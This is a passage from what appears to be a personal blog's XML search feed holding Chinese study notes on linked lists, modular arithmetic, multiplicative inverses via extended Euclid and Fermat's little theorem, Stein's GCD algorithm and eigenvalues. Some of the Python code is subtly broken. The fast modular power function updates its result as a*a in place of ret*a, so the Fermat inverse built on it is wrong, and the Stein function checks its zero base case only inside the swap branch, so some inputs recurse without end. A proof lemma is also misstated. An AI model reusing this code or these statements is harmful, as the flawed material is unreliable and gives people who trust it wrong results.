class="title">record</span><span class="params">(<span class="number">20181209</span>, <span class="string">&quot;Phoenix&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function">LinkList&lt;PHONEBOOK&gt; <span class="title">list</span><span class="params">(pbook, <span class="number">2</span>)</span></span>;</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    list.<span class="built_in">Insert</span>(<span class="number">1</span>, record);</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    PHONEBOOK x = list.<span class="built_in">Delete</span>(<span class="number">3</span>);</span><br><span class="line">    x.<span class="built_in">print</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    <span class="type">int</span> p = list.<span class="built_in">Locate</span>(record);</span><br><span class="line">    cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实现链表的链接">实现链表的链接</h2>
<p>​
对于只带有头结点的单链表，需要遍历找到链表的尾结点，再进行链表的链接</p>
<p>​ 而对于带有尾结点的循环链表，只需要链接即可，故时间复杂度为O(1)</p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230307085856447.png" /></p>
<p>​ 教材中给出的为带头结点的单循环链表的链接实现代码。</p>
<p>​ 下面给出带尾结点单循环链表链接的实现代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> CLinkList&lt;T&gt;::<span class="built_in">Connect</span>(CLinkList&lt;T&gt; &amp;b)<span class="comment">//b为链接的链表</span></span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *q=b.rear-&gt;next;<span class="comment">//保存b链表的表头</span></span><br><span class="line">    b.rear-&gt;next=rear-&gt;next;<span class="comment">//b链表的表尾指向当前链表的表头</span></span><br><span class="line">    rear-&gt;next=q-&gt;next;<span class="comment">//当前链表的表尾指向b链表的起始元素</span></span><br><span class="line">    rear-&gt;data=q-&gt;data;</span><br><span class="line">    rear=b.rear;</span><br><span class="line">    <span class="keyword">delete</span> q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="双链表-1">双链表</h2>
<p>​ 有一个直接前驱结点和一个直接后继结点，表中有两条方向相反的链</p>
<p>​ 双链表的实现：</p>
<h2 id="stl中的双链表list">STL中的双链表——list</h2>
<p>​
list容器使用不连续的空间区域，允许向前或向后遍历元素，但是不支持随机访问，查找某个元素时往往需要遍历相邻的若干元素，优点在于任何位置都可以高效地插入或删除，并不需要移动其他元素。</p>
<p>​</p>
<h1 id="树">树</h1>
<p>​ 非线性，结点之间有分支，并具有层次关系。</p>
<p>​</p>
]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>模运算以及乘法逆元</title>
    <url>/archives/ab5f57f8.html</url>
    <content><![CDATA[<h1 id="基本的模运算">基本的模运算</h1>
<p>a,b,p均为整数</p>
<p>模p加法：<span class="math inline">\((a+b)\%p\)</span></p>
<p>模p减法：<span class="math inline">\((a-b)\%p\)</span></p>
<p>模p乘法：<span class="math inline">\((a*b)\%p\)</span> <span id="more"></span>
## Notes</p>
<p>同余式：正整数a,b对p取模，它们的余数相同，记作<span
class="math inline">\(a \equiv b(mod\space p)\)</span></p>
<h2 id="基本性质">基本性质</h2>
<p>1.若p=a-b,则<span class="math inline">\(a \equiv b\mod p\)</span>
例如 <span class="math inline">\(11\equiv 4\mod 7\)</span></p>
<p>2.传递性：若<span class="math inline">\(a\equiv b\mod
p\)</span>且<span class="math inline">\(b\equiv c\mod p\)</span>,则<span
class="math inline">\(a\equiv c\mod p\)</span></p>
<h2 id="运算规则">运算规则</h2>
<p><span class="math display">\[
\begin{split}
(a+b)\mod p&amp;=(a\mod p+b\mod p)\mod p\\\\
(a-b)\mod p&amp;=(a\mod p-b\mod p)\mod p\\\\
(a*b)\mod p&amp;=(a\mod p*b\mod p)\mod p\\\\
(a^b)\mod p&amp;=((a\mod p)^b)\mod p\\\\
\nonumber
\end{split}
\]</span></p>
<h3 id="结合律">结合律</h3>
<p><span class="math display">\[
\begin{split}
((a+b\mod p+c)\mod p&amp;=(a+(b+c)\mod p)\mod p\\\\
((a*b\mod p*c)\mod p&amp;=(a*(b*c)\mod p)\mod p\\\\
\nonumber
\end{split}
\]</span></p>
<h3 id="交换律">交换律</h3>
<h3 id="分配律">分配律</h3>
<p><span class="math display">\[
(((a+b)\mod p)*c)\mod p=((a*c)\mod p+(b*c)\mod p)\mod p
\]</span></p>
<h3 id="重要定理">重要定理</h3>
<p><span class="math inline">\(若a\equiv b\mod p\)</span>
则对于任意的c,都有 <span class="math inline">\((a+c)\equiv(b+c)\mod
p\)</span></p>
<p><span class="math inline">\(若a\equiv b\mod p\)</span>
则对于任意的正整数c,都有 <span
class="math inline">\((a*c)\equiv(b*c)\mod p\)</span></p>
<p><span class="math inline">\(若a\equiv b\mod p,c\equiv d\mod
p\)</span> 则对于任意的c,都有 <span
class="math inline">\((a+c)\equiv(b+d)\mod p,(a-c)\equiv(b-d)\mod
p,(a*c)\equiv(b*d)\mod p\)</span></p>
<h1 id="乘法逆元">乘法逆元</h1>
<h2 id="定义">定义</h2>
<p>如果ax≡1 (mod
p),且gcd(a,p)=1（a与p互质），则称a关于模p的乘法逆元为x。</p>
<h3 id="例子">例子</h3>
<p>例如：4关于1模7的乘法逆元为多少？</p>
<p>4X≡1 mod 7</p>
<p>这个方程等价于求一个X和K，满足</p>
<p>4X=7K+1</p>
<p>其中X和K都是整数。</p>
<p>若ax≡1(mod f), 则称a关于1模f的乘法逆元为x。也可表示为ax≡1(mod
f)。</p>
<p>当a与f互素时，a关于模f的乘法逆元有解。如果不互素，则无解。如果f为素数，则从1到f-1的任意数都与f互素，即在1到f-1之间都恰好有一个关于模f的乘法逆元。</p>
<p>例如，求5关于模14的乘法逆元：</p>
<p>14=5*2+4</p>
<p>5=4*1+1</p>
<p>说明5与14互素，存在5关于14的乘法逆元。</p>
<p>1=5-4=5-(14-5*2)=5*3-14</p>
<p>因此，5关于模14的乘法逆元为3。</p>
<h1 id="扩展欧几里得定理">扩展欧几里得定理</h1>
<h2 id="欧几里得算法辗转相除法">欧几里得算法(辗转相除法)</h2>
<p>即以除数和余数反复做除法运算，当余数为0时，取当前算式除数为最大公约数</p>
<h3 id="证明">证明</h3>
<p>引理1：若d是a和b的公约数，那么d也是b和c的公约数（c=a%b）</p>
<p>引理2：若d是b和c的公约数(c=a%b)那么d也是b和c的公约数</p>
<p>定理：两个整数的最大公约数等于其中较小的那个数和两数相除余数的最大公约数。</p>
<p>证法：</p>
<p>a可以表示成<span
class="math inline">\(a=kb+r\)</span>(a,b,k,r均为正整数且r&lt;b)</p>
<p>假设d是a，b的一个公约数，记作<span
class="math inline">\(d|a,d|b\)</span>，即a和b都可以被d整除</p>
<p>而<span class="math inline">\(r=a-kb\)</span>，两边同时除以d，<span
class="math inline">\(r/d=a/d-kb/d\)</span>，由等式右边可知<span
class="math inline">\(m=r/d\)</span>为整数，因此<span
class="math inline">\(d|r\)</span></p>
<p>因此d也是b，a mod b的公约数</p>
<p>因(a,b)和(b,a mod b)的公约数相等，则其最大公约数也相等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> gcd(b,a%b) <span class="keyword">if</span> b <span class="keyword">else</span> a</span><br></pre></td></tr></table></figure>
<p>时间复杂度为O(log n)</p>
<h2 id="本体">本体</h2>
<p>设两个式子 <span class="math display">\[
\begin{split}
ax+by&amp;=gcd(a,b)\\\\
bx&#39;+(a\mod b)y&#39;&amp;=gcd(b,a\mod b)
\nonumber
\end{split}
\]</span> 由欧几里得算法知:<span
class="math inline">\(gcd(a,b)=gcd(b,a\mod b)\)</span></p>
<p>所以 <span class="math inline">\(ax+by=bx&#39;+(a\mod
b)y&#39;\)</span></p>
<p>而 <span class="math inline">\(a\mod b=a-kb\)</span></p>
<p>其中k=[a/b]</p>
<p>所以有<span
class="math inline">\(ax+by=bx&#39;+(a-kb)y&#39;\)</span></p>
<p>展开移项得：<span
class="math inline">\(ax+by=ay&#39;+b(x&#39;-ky&#39;)\)</span></p>
<p>根据对应系数关系，可以设</p>
<p>$ x=y'、y=x'-ky'$来进一步求一个可行解</p>
<p>递归地使用x'、y'表示“上一步”的x、y，就能递归地把问题转化为 <span
class="math display">\[
bx&#39;+(a\mod b)y&#39;=gcd(b,a\mod b)
\]</span>
x和y会不断减小，类似gcd()的递归终点，当扩展欧几里得算法exgcd()的a<span
class="math inline">\(a&#39;x&#39;+b&#39;y&#39;=gcd(a&#39;,b&#39;)\)</span>中的<span
class="math inline">\(b&#39;\)</span>为0时，可以得到递归终点的<span
class="math inline">\(x&#39;=1,y&#39;=0\)</span>，层层回溯套用前面等式
<span class="math display">\[
\begin{split}
x&amp;=y&#39;\\\\y&amp;=x&#39;-ky&#39;
\end{split}
\]</span> 就能得到<span
class="math inline">\(ax+by=gcd(a,b)\)</span>的一组可行解</p>
<h2 id="算法">算法</h2>
<p>对于任意两个整数 a, b，必存在整数 x, y，使得 ax + by = gcd(a,b)
成立，求出整数解 x, y，可以得到 gcd(a,b).</p>
<h2 id="具体步骤">具体步骤</h2>
<p>1.定义 x<sub>1</sub> = 1, y<sub>1</sub> = 0, x<sub>2</sub> = 0,
y<sub>2</sub> = 1</p>
<p>2.若 b ≠ 0，使用带余除法，用 b 除以 a 得到余数 r；否则转到第4步</p>
<p>3.用 b 代替 a, 用 r 代替 b， 令 x<sub>1</sub>, y<sub>1</sub>,
x<sub>2</sub>, y<sub>2</sub> = x<sub>2</sub>, y<sub>2</sub>,
x<sub>1</sub> - q·x<sub>2</sub>, y<sub>1</sub> -
q·y<sub>2</sub>，重复第2步</p>
<p>4.a 的值就是最大公约数 d，x<sub>1</sub> 和 y<sub>1</sub> 的值就是所求
x 和 y</p>
<h3 id="代码实现">代码实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exgcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">    x,y,g=exgcd(b,a%b)</span><br><span class="line">    x,y=y,(x-(a//b)*y)</span><br><span class="line">    <span class="keyword">return</span> x,y,g</span><br></pre></td></tr></table></figure>
<p>模拟矩阵运算的扩展欧几里得算法：https://www.cnblogs.com/kentle/p/14975039.html</p>
<h2 id="求逆元">求逆元</h2>
<p>逆元：a关于模b得逆元整数d满足<span class="math inline">\(a*d\mod
b\equiv 1\)</span></p>
<p>扩展欧几里得：求方程<span
class="math inline">\(ax+by=gcd(a,b)\)</span> 的一组可行解</p>
<p>关系：<span class="math inline">\((a*d) (mod\space
b)\equiv1\)</span>，等价于 ad-kb=1,其中k为未知整数</p>
<p>设d为x，-k为y，则<span
class="math inline">\(ad-kb=1\)</span>转化为<span
class="math inline">\(ax+by=1\)</span></p>
<p>求出x即可得到a关于模b的逆元</p>
<p>当x为负值的时候</p>
<h3 id="代码实现-1">代码实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exgcdinv</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">    x,y,g=exgcdinv(b,a%b)</span><br><span class="line">    t=x</span><br><span class="line">    x=y</span><br><span class="line">    y=t-a//b*y</span><br><span class="line">    <span class="keyword">return</span> x,y,g</span><br></pre></td></tr></table></figure>
<p>时间复杂度为O(log n)（斐波那契复杂度）</p>
<h2 id="补充">补充</h2>
<p>1.显然，当x求出负值时，由于乘法逆元应为正，经验证,若<span
class="math inline">\(a*d\mod b\equiv
1\)</span>，d=x+b（证明推导留待时候）</p>
<p>2.python自带的pow函数pow(a,b,c)，当b为-1的时候，可以求a关于模c的乘法逆元</p>
<p><strong>存在即可求</strong></p>
<h1 id="费马小定理">费马小定理</h1>
<h2 id="前置知识">前置知识</h2>
<h3 id="费马小定理-1">费马小定理</h3>
<p>对于整数a与质数b，若a与b互质，则有 <span class="math display">\[
a^{b-1}\mod b\equiv 1
\]</span></p>
<h3 id="快速幂取模">快速幂取模</h3>
<p>两数之积取模等于对两数分别取模然后对积取模 <span
class="math display">\[
(a*b)\mod p=((a\mod p)*(b\mod p))\mod p
\]</span></p>
<h4 id="代码实现-2">代码实现</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">powmod</span>(<span class="params">a,n,mod</span>):</span><br><span class="line">    ret=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span> ==<span class="number">1</span>:</span><br><span class="line">            ret=a*a % mod</span><br><span class="line">        a=a*a % mod</span><br><span class="line">        n//=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>
<h2 id="求逆元-1">求逆元</h2>
<p><span class="math inline">\(a^{b-1}\mod b\equiv 1\)</span> 等价于
<span class="math inline">\(a*a^{b-2}\mod b\equiv 1\)</span></p>
<p>显然<span class="math inline">\(a^{b-2}\)</span>就是a mod b
的逆元</p>
<p>用b-2和b代替快速幂取模中的n和mod:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Fermatinv</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> powmod(a,b-<span class="number">2</span>,b)</span><br></pre></td></tr></table></figure>
<p>时间复杂度：大约O(log b)</p>
<p>适用范围：在模数b是质数时</p>
<h1 id="stein算法">Stein算法</h1>
<p>只有整数的移位和加减法，便于大素数求公约数</p>
<h2 id="前置知识-1">前置知识</h2>
<p><span
class="math inline">\(gcd(a,a)=a\)</span>，即一个数和他自身的公约数是其自身</p>
<p><span
class="math inline">\(gcd(ka,kb)=kgcd(a,b)\)</span>也就是最大公约数运算和倍乘运算可以交换，特殊的，当k=2时，说明两个偶数的最大公约数必然能被2整除</p>
<h2 id="算法步骤">算法步骤</h2>
<p>假设A<sub>1</sub>=A,B<sub>1</sub>=B,C<sub>1</sub>=1</p>
<p>for n=1,2,3...do:</p>
<p>1.若A<sub>n</sub>=0或B<sub>n</sub>=0，则max(A<sub>n</sub>,B<sub>n</sub>)*C<sub>n</sub>为最大公约数，算法结束</p>
<p>2.若A<sub>n</sub>和B<sub>n</sub>均为偶数，则A<sub>n+1</sub>=若A<sub>n</sub>/2，B<sub>n+1</sub>=B<sub>n</sub>/2，C<sub>n+1</sub>=2*C<sub>n</sub></p>
<p>3.若A<sub>n</sub>为偶数，B<sub>n</sub>为奇数，则A<sub>n+1</sub>=A<sub>n</sub>/2,B<sub>n+1</sub>=B<sub>n</sub></p>
<p>4.若A<sub>n</sub>为奇数，B<sub>n</sub>为偶数，则A<sub>n+1</sub>=A<sub>n</sub>，B<sub>n+1</sub>=B<sub>n</sub>/2</p>
<p>5.若A<sub>n</sub>，B<sub>n</sub>均为奇数，则A<sub>n+1</sub>=|A<sub>n</sub>-B<sub>n</sub>|/2</p>
<p>B<sub>n+1</sub>=min（A<sub>n</sub>,B<sub>n</sub>）,C<sub>n+`</sub>=C<sub>n</sub></p>
<h2 id="代码实现-3">代码实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Stein</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span> a&lt;b:</span><br><span class="line">        a,b=b,a</span><br><span class="line">        <span class="keyword">if</span>(b==<span class="number">0</span>):<span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span> a%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">and</span> b%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*Stein(a&gt;&gt;<span class="number">1</span>,b&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> a%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> Stein(a&gt;&gt;<span class="number">1</span>,b)</span><br><span class="line">    <span class="keyword">if</span> b%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> Stein(a,b&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> Stein(<span class="built_in">abs</span>(a-b)&gt;&gt;<span class="number">1</span>,<span class="built_in">min</span>(a,b))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>模运算</tag>
        <tag>乘法逆元</tag>
        <tag>Number Theory</tag>
      </tags>
  </entry>
  <entry>
    <title>特征值与特征向量</title>
    <url>/archives/767cd5d9.html</url>
    <content><![CDATA[<p>CTF这周又被成功的出脑了，光搞数学去了。</p>
<p><del>虽然还写了一页buuctf的题，但感觉没啥价值</del>，还得先把之前那几场比赛的题以及涉及到的知识点弄明白先</p>
<p>一向直性子的范大将军直言：</p>
<p>“诶哟，谢天谢地了，我已经说了，你像这样的比赛本身就没有打好基础，你能跟我保证在关键的比赛能赢？务实一点，我劝你先把<strong>数学</strong>这个理念先搞懂。”</p>
<p><del>还被阿根廷球迷舍友拉去看世界杯了（）</del></p>
<p>昨晚凌晨进球，整栋宿舍楼在震，迷迷糊糊垂死病中惊坐起。 <span id="more"></span>
# 特征值与特征向量</p>
<p>设A为n阶方阵，如果有可逆矩阵 <span
class="math inline">\(P=(\alpha_1,\alpha_2,\cdots,\alpha_n)\)</span>
，使得 <span
class="math inline">\(P^{-1}AP=diag(\lambda_1,\lambda_2,\cdots,\lambda_n)\)</span>
为对角矩阵，则 <span
class="math inline">\(AP=Pdiag(\lambda_1,\lambda_2,\cdots,\lambda_n)\)</span>
，于是 <span class="math display">\[
(A\alpha_1,A\alpha_2,\cdots,A\alpha_n)=(\lambda_1\alpha_1,\lambda_2\alpha_2,\cdots,\lambda_n\alpha_n)
\]</span> 即 <span
class="math inline">\(A\alpha_i=\lambda_i,i=1,2,\cdots,n.\)</span></p>
<p>称 <span
class="math inline">\(\alpha_1,\alpha_2,\cdots,\alpha_n\)</span>
为方阵<strong>A</strong>的特征向量.</p>
<h2 id="定义1特征值的定义">定义1（特征值的定义）</h2>
<p>设<strong>A</strong>为n阶方阵.如果存在数λ和非零向量<strong>α</strong>，使得<strong>Aα</strong>=λ<strong>α</strong>，则称λ为<strong>A</strong>的特征值，称<strong>α</strong>为<strong>A</strong>的属于特征值λ的特征向量（或<strong>A</strong>对应于特征值λ的特征向量）</p>
<p>将<strong>Aα</strong>=λ<strong>α</strong>改写为(λ<strong>E</strong>-<strong>A</strong>)<strong>α</strong>=<strong>0</strong>，——&gt;对于特征值λ，齐次线性方程组(λ<strong>E</strong>-<strong>A</strong>)<strong>x</strong>=<strong>0</strong>是有非零解的</p>
<p>若齐次线性方程组(λ<strong>E</strong>-<strong>A</strong>)<strong>x</strong>=<strong>0</strong>有非零解<strong>α<sub>0</sub></strong>，则数λ<sub>0</sub>是<strong>A</strong>的特征值，<strong>α<sub>0</sub></strong>是属于特征值<strong>λ<sub>0</sub></strong>的特征向量.</p>
<p>数λ是A的特征值当且仅当齐次线性方程组(λ<strong>E</strong>-<strong>A</strong>)<strong>x</strong>=<strong>0</strong>有非零解</p>
<p>齐次线性方程组(λ<strong>E</strong>-<strong>A</strong>)<strong>x</strong>=<strong>0</strong>有非零解的充要条件是|(λ<strong>E</strong>-<strong>A</strong>)|=<strong>0</strong></p>
<p>因此，数λ是<strong>A</strong>的特征值当且仅当|(λ<strong>E</strong>-<strong>A</strong>)|=<strong>0</strong></p>
<h2 id="定义2特征方程">定义2（特征方程）</h2>
<p>设<strong>A</strong>=(<strong>a<sub>ij</sub></strong>)为n阶方阵，
<span class="math display">\[
|\lambda E-A|=\begin{vmatrix}\
\lambda-a_{11} &amp;-a_{12} &amp;\cdots &amp;-a_{1n}\\
-a_{21} &amp;\lambda-a_{22} &amp;\cdots &amp;-a_{2n}\\
\vdots &amp;\vdots &amp; &amp; \vdots\\
-a_{n1} &amp;-a{n2} &amp;\cdots &amp;\lambda-a_{nn}
\end{vmatrix}
\]</span>
是一个关于λ的n次多项式，称为<strong>A</strong>的特征多项式.</p>
<p>方程|(λ<strong>E</strong>-<strong>A</strong>)|=<strong>0</strong>是一个以λ为未知量的一元n次方程，称为A的<strong>特征方程</strong></p>
<p>显然，<strong>A</strong>的特征值就是<strong>A</strong>的特征方程的根（因而又将<strong>特征值</strong>称为<strong>特征根</strong>）</p>
<p>n阶方阵A的特征方程在复数范围有n个根（重根按重数计），所以n阶方阵<strong>A</strong>在复数范围内有n个特征值.对于<strong>A</strong>的特征值λ，<strong>A</strong>的属于特征值λ的特征向量<strong>α</strong>就是齐次线性方程组(λ<strong>E</strong>-<strong>A</strong>)<strong>x</strong>=<strong>0</strong>的非零解</p>
<p>特征向量总是相对于特征值而言的，一个特征值所具有的特征向量不唯一</p>
<h2 id="求解步骤">求解步骤</h2>
<p>(1)求出特征值（根）|(λ<strong>E</strong>-<strong>A</strong>)|=<strong>0</strong></p>
<p>(2)求出特征向量——&gt;求出方程组(λ<strong>E</strong>-<strong>A</strong>)<strong>x</strong>=<strong>0</strong>的非零解</p>
<p>设λ=λ<sub>i</sub>为方阵A的一个特征值，则由方程(<strong>A</strong>-λ<sub>i</sub><strong>E</strong>)<strong>x</strong>=<strong>0</strong>
可求得非零解<strong>x</strong>=<strong>p<sub>i</sub></strong> ，</p>
<p><strong>p<sub>i</sub></strong>即是对应于特征值λ<sub>i</sub>的特征向量</p>
<h2 id="性质1">性质1</h2>
<p>若<strong>α<sub>1</sub>，α<sub>2</sub></strong>都是<strong>A</strong>的属于特征值λ<sub>0</sub>的特征向量，则对任意使
<span class="math inline">\(k_1\alpha_1+k_2\alpha_2 \neq0\)</span>
的数k<sub>1</sub>和k<sub>2</sub>，<span
class="math inline">\(\alpha=k_1\alpha_1+k_2\alpha_2\)</span>
仍是<strong>A</strong>属于特征值λ<sub>0</sub>的特征向量</p>
<p><strong>属于同一特征值</strong>的<strong>特征向量</strong>的<strong>非零线性组合</strong>仍是属于这个特征值的特征向量</p>
<p>每个特征值对应有无穷多个特征向量</p>
<p>解空间的线性封闭性</p>
<h2 id="性质2">性质2</h2>
<p>设 <span
class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_n\)</span>
为n阶方阵<strong>A</strong>= <span
class="math inline">\((a_{ij})\)</span> 的n个特征值，则 <span
class="math display">\[
\begin{split}
&amp;(1)\lambda_1\lambda_2\cdots\lambda_n=|A|\\
&amp;(2)\lambda_1+\lambda_2+\cdots+\lambda_n=a_{11}+a_{22}+\cdots+a_{nn}\\
&amp;记a_{11}+a_{22}+\cdots+a_{nn}为trA，称为A的迹
\end{split}
\]</span> 证明： <span class="math display">\[
|\lambda E-A|=\begin{vmatrix}\
\lambda-a_{11} &amp;-a_{12} &amp;\cdots &amp;-a_{1n}\\
-a_{21} &amp;\lambda-a_{22} &amp;\cdots &amp;-a_{2n}\\
\vdots &amp;\vdots &amp; &amp; \vdots\\
-a_{n1} &amp;-a{n2} &amp;\cdots &amp;\lambda-a_{nn}\
\end{vmatrix}
\]</span> 右式的展开式只有项 <span class="math inline">\((\lambda
a_{11})(\lambda a_{22})\cdots(\lambda a_{nn})\)</span>
的展开式由λ的n和n-1次项。这个行列式的展开式中其它项都含有至少一个不在对角线上的元素，设为a<sub>ij</sub>，该行列式对角线上的元素a<sub>ii</sub>-λ和a<sub>jj</sub>-λ都不能出现在这个项中，于是这个项的最高次数为n-2</p>
<h2 id="推论1">推论1</h2>
<p>设<strong>A</strong>为<strong>n</strong>阶方阵，则|<strong>A</strong>|=<strong>0</strong>的充要条件是是λ=<strong>0</strong>为<strong>A</strong>的特征值</p>
<p>由(1)可得</p>
<h2 id="推论2">推论2</h2>
<p>n阶矩阵可逆 = <strong>A</strong>的n个特征值 <span
class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_n\)</span>
全不为零</p>
<h2 id="性质3">性质3</h2>
<p>n阶方阵<strong>A</strong>与它的转置矩阵<strong>A<sup>T</sup></strong>有相同的特征多项式，因而有相同的特征值</p>
<p>但<strong>A</strong>与<strong>A<sup>T</sup></strong>未必有相同的特征向量</p>
<h2 id="性质4">性质4</h2>
<p>若λ为<strong>A</strong>的特征值，则对任意多项式 <span
class="math inline">\(f(x)=a_mx^m+a_{m-1}x^{m-1}+\cdots+a_1x+a_0\)</span>
，<span class="math inline">\(f(\lambda)\)</span> 为 <span
class="math inline">\(f(A)\)</span> 的特征值，其中 <span
class="math inline">\(f(A)=a_mA^m+a_{m-1}A^{m-1}+\cdots+a_1A+a_0E\)</span>
为与f(x)对应的<strong>A</strong>的矩阵多项式；当<strong>A</strong>可逆时，
<span class="math inline">\(\frac{1}{\lambda}\)</span>
是<strong>A<sup>-1</sup></strong>的特征值</p>
<p>λ是方阵<strong>A</strong>的特征值，λ<sup>k</sup>是<strong>A<sup>k</sup></strong>的特征值（数学归纳法可证），
<span class="math display">\[
\begin{split}
&amp;\varphi(\lambda)=a_0+a_1\lambda+\cdots+a_m\lambda^m\\
&amp;\varphi(A)=a_0E+a_1A+\cdots+a_mA^m
\end{split}
\]</span>
<strong>A</strong>与f(x)及<strong>A<sup>-1</sup></strong>（在可逆的前提下）有相同的特征向量<strong>α</strong></p>
<p><strong>A<sup>T</sup></strong>=-<strong>A</strong>(反对称阵)，则<strong>A</strong>+<strong>E</strong>可逆</p>
<p><strong>A<sup>2</sup></strong>=E（称<strong>A</strong>为对合矩阵），则<strong>A</strong>的特征值只能为1或-1</p>
<h1 id="方阵的相似化简">方阵的相似化简</h1>
<h2 id="定义3相似矩阵">定义3（相似矩阵）</h2>
<p>设<strong>A</strong>，<strong>B</strong>为n阶方阵。如果存在某个n阶可逆矩阵<strong>P</strong>，使得<strong>B</strong>=<strong>P<sup>-1</sup>AP</strong>，则称<strong>B</strong>是<strong>A</strong>的相似矩阵，或称<strong>A</strong>与<strong>B</strong>相似，记为<strong>A</strong>~<strong>B</strong></p>
<p>(1)反身性：<strong>A</strong>~<strong>A</strong></p>
<p>(2)对称性：<strong>A</strong>~<strong>B</strong>，则<strong>B</strong>~<strong>A</strong></p>
<p>(3)传递性：若<strong>A</strong>~<strong>B</strong>,<strong>B</strong>~<strong>C</strong>,则<strong>A</strong>~<strong>C</strong></p>
<p>相似矩阵有相同的行列式</p>
<h2 id="性质5">性质5</h2>
<p>如果<strong>A</strong>~<strong>B</strong>,则<strong>A</strong>与<strong>B</strong>有相同的特征多项式，因而有相同的特征值与行列式</p>
<h2 id="性质6">性质6</h2>
<p>如果<strong>A</strong>~<strong>B</strong>，则f(<strong>A</strong>)~f(<strong>B</strong>),其中f(x)=a<sub>m</sub>x<sup>m</sup>+a<sub>m-1</sub>m<sup>m-1</sup>+...+a<sub>1</sub>x+a<sub>0</sub></p>
<h2 id="性质7">性质7</h2>
<p>如果<strong>A</strong>~<strong>B</strong>，<strong>A</strong>可逆，则<strong>B</strong>可逆，且<strong>A<sup>-1</sup></strong>~<strong>B<sup>-1</sup></strong></p>
<h2 id="a可对角化">A可对角化</h2>
<p>能找到可逆的矩阵P，使得<strong>P<sup>-1</sup>AP</strong>为对角矩阵</p>
<h2 id="定理1">定理1</h2>
<p>n阶方阵<strong>A</strong>相似于对角矩阵的充分必要条件是<strong>A</strong>有n个<strong>线性无关</strong>的特征向量.</p>
<p>可逆矩阵P的行(列)向量组是<strong>线性无关向量组</strong></p>
<p>定理告诉我们：只需要找出A的n个线性无关的特征向量 <span
class="math inline">\(p_1,p_2,\cdots,p_n\)</span>
以它们为<strong>列向量</strong>构成 <span
class="math inline">\(P=(p_1,p_2,\cdots,p_n)\)</span> ，则 <span
class="math inline">\(P^-1AP\)</span>
为对角矩阵.这个对角矩阵称为<strong>A</strong>的<strong>相似标准形</strong>，其对角元素恰好为<strong>A</strong>的n个特征值</p>
<h2 id="定义4">定义4</h2>
<p>如果存在可逆矩阵<strong>P</strong>，使得<strong>P<sup>-1</sup>AP</strong>=<strong>Λ</strong>为对角矩阵，则称对角矩阵<strong>Λ</strong>为<strong>A</strong>的<strong>相似标准形</strong></p>
<p>在求<strong>A</strong>的相似标准形<strong>Λ</strong>时，<strong>Λ</strong>的对角元可以是按任意顺序排列的.但是<strong>P</strong>的各列的排列次序与<strong>Λ</strong>中各个对角元（即<strong>A</strong>的全体特征值）的排列次序必须互相对应，<strong>P</strong>的第k列所对应的特征值就是<strong>Λ</strong>的第k个对角元素（k=1,2...,n）.</p>
<h2 id="定理2">定理2</h2>
<p>设 <span
class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_m\)</span>是方阵<strong>A</strong>的m个特征值，<span
class="math inline">\(p_1,p_2,\cdots,p_m\)</span>
依次是与之对应的特征向量.如果 <span
class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_m\)</span>
各不相等，则 <span class="math inline">\(p_1,p_2,\cdots,p_m\)</span>
线性无关</p>
<blockquote>
<p>证明：设有常数 <span
class="math inline">\(x_1,x_2,\cdots,x_m\)</span> 使 <span
